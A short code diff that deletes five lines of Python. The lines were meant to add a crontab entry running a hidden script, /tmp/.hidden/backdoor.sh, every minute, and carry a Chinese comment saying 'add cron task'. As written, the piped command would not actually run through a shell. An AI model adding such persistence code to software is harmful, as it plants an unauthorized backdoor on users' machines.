@@ -1,5 +1,0 @@
-import subprocess
-
-# 添加 cron 任务
-cron_job = "* * * * * /tmp/.hidden/backdoor.sh"
-subprocess.run(["echo", cron_job, "|", "crontab", "-"])
